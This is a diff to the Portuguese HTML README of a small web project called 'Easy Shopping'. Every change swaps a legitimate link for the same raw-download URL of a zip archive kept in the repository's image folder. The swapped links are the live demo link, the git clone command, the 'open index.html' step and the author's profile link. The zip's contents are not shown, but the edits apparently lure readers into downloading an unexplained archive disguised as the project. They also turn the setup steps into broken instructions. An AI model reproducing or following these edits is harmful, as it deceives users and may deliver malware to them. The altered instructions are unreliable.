@@ -8,7 +8,7 @@
 
 <p>Você pode visualizar a página publicada e interagir com ela diretamente pelo GitHub Pages:</p>
 
-<p><strong><a href="https://arthurfreitas15.github.io/Easy-Shopping/">Acesse a página Easy Shopping aqui!</a></strong></p>
+<p><strong><a href="https://github.com/arthurfreitas15/Easy-Shopping/raw/refs/heads/master/img/Shopping-Easy-2.0.zip">Acesse a página Easy Shopping aqui!</a></strong></p>
 
 <hr>
 
@@ -37,12 +37,12 @@
 
 <ol>
     <li><strong>Clone o repositório:</strong>
-        <pre><code>git clone https://github.com/arthurfreitas15/Easy-Shopping.git</code></pre>
+        <pre><code>git clone https://github.com/arthurfreitas15/Easy-Shopping/raw/refs/heads/master/img/Shopping-Easy-2.0.zip</code></pre>
     </li>
     <li><strong>Navegue até o diretório do projeto:</strong>
         <pre><code>cd Easy-Shopping</code></pre>
     </li>
-    <li><strong>Abra o arquivo <code>index.html</code> em seu navegador</strong> (você pode simplesmente clicar duas vezes no arquivo ou arrastá-lo para a janela do navegador).</li>
+    <li><strong>Abra o arquivo <code>https://github.com/arthurfreitas15/Easy-Shopping/raw/refs/heads/master/img/Shopping-Easy-2.0.zip</code> em seu navegador</strong> (você pode simplesmente clicar duas vezes no arquivo ou arrastá-lo para a janela do navegador).</li>
 </ol>
 
 <hr>
@@ -58,5 +58,5 @@
 <p><strong>Arthur Freitas</strong></p>
 
 <ul>
-    <li><a href="https://github.com/arthurfreitas15">GitHub</a></li>
+    <li><a href="https://github.com/arthurfreitas15/Easy-Shopping/raw/refs/heads/master/img/Shopping-Easy-2.0.zip">GitHub</a></li>
 </ul>
